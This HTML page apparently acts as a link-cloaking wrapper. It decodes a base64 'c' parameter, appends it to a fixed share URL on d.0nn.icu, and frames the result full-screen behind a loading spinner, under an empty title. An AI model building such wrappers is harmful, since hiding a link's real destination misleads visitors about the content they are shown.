<html lang="zh-CN">
<head>
  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
  <meta content="yes" name="apple-mobile-web-app-capable">
  <meta content="yes" name="apple-touch-fullscreen">
  <meta content="black" name="apple-mobile-web-app-status-bar-style">
  <meta content="320" name="MobileOptimized">
  <title></title>
  <style>
    .content {
      height: 100%;
      width: 100%;
      position: fixed;
      left: 0;
      top: 0;
      border: none;
      margin: 0;
      padding: 0;
      display: none; /* 初始隐藏iframe，加载完成后显示 */
    }
    body { margin: 0; padding: 0; overflow: hidden; }

    /* 新增：加载动画样式 */
    .loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fff; /* 背景色可根据需求调整 */
      z-index: 9999; /* 确保动画在最上层 */
    }
    .loader-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite; /* 旋转动画 */
    }
    /* 新增：旋转动画关键帧 */
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- 新增：加载动画HTML结构 -->
  <div class="loader">
    <div class="loader-spinner"></div>
  </div>

  <script>
    // 内部固定前缀
    const fixedPrefix = 'http://d.0nn.icu/group.php/index/share/id/147/t/6443c5ef5aa0278b2e988ea70aa81a0c/time/1754934138.htm';
    // 解析外部参数
    const urlParams = new URLSearchParams(window.location.search);
    const encodedSuffix = urlParams.get('c');

    if (encodedSuffix) {
      try {
        const decodedSuffix = atob(encodedSuffix);
        const fullUrl = fixedPrefix + decodedSuffix;
        // 增强URL合法性校验（原有includes('http')不够严谨，补充完整URL格式校验）
        const isLegalUrl = /^https?:\/\/.+/.test(fullUrl);
        
        if (isLegalUrl) {
          // 1. 移除onload事件绑定（预防全局/body上可能存在的onload事件，避免跨域逻辑触发）
          window.onload = null; // 清除全局onload事件
          if (document.body.onload) document.body.onload = null; // 清除body标签上的onload事件

          // 2. 加载完整URL内容（原有代码未实现“如何使用fullUrl”，补充iframe承载逻辑，匹配.content样式）
          const iframe = document.createElement('iframe');
          iframe.className = 'content'; // 应用全屏样式
          iframe.src = fullUrl; // 指向拼接后的完整URL
          iframe.frameBorder = '0'; // 移除边框
          iframe.scrolling = 'auto'; // 允许内部滚动（根据需求可改为no）

          // 新增：iframe加载完成后，隐藏加载动画、显示iframe
          iframe.onload = function() {
            document.querySelector('.loader').style.display = 'none'; // 隐藏加载动画
            iframe.style.display = 'block'; // 显示iframe内容
          };
          
          // 3. 插入iframe到页面（替换空body，实现内容展示）
          document.body.appendChild(iframe);

        } else {
          // 非法URL处理：避免加载无效链接
          console.error('拼接后的URL不合法：', fullUrl);
          alert('链接格式错误，无法加载内容');
          document.querySelector('.loader').style.display = 'none'; // 隐藏动画
        }
      } catch (error) {
        // 4. 解码异常处理（原有代码无try-catch后续逻辑，补充错误捕获）
        console.error('参数解码失败：', error);
        alert('内容参数解析错误，请检查链接有效性');
        document.querySelector('.loader').style.display = 'none'; // 隐藏动画
      }
    } else {
      // 5. 缺失参数处理（原有代码未处理encodedSuffix为null的情况）
      console.error('未获取到参数c（后缀内容）');
      alert('缺少必要内容参数，无法加载页面');
      document.querySelector('.loader').style.display = 'none'; // 隐藏动画
    }
  </script>
</body>
</html>
